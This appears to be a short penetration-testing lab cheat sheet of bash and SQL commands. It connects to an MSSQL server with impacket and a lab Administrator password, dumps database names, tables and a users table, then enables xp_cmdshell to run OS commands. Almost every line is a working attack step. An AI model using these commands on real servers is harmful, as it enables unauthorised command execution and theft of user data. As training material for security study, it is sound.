
```bash
# Use impacket-mssqlclient to connect
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth

# Once connected:
 
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM offsec.information_schema.tables;
select * from offsec.dbo.users;

# Enable xp_cmdshell
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# Execute xp_cmdshell
EXECUTE xp_cmdshell 'whoami';

# Wait 5 seconds
WAITFOR DELAY '00:00:05';



```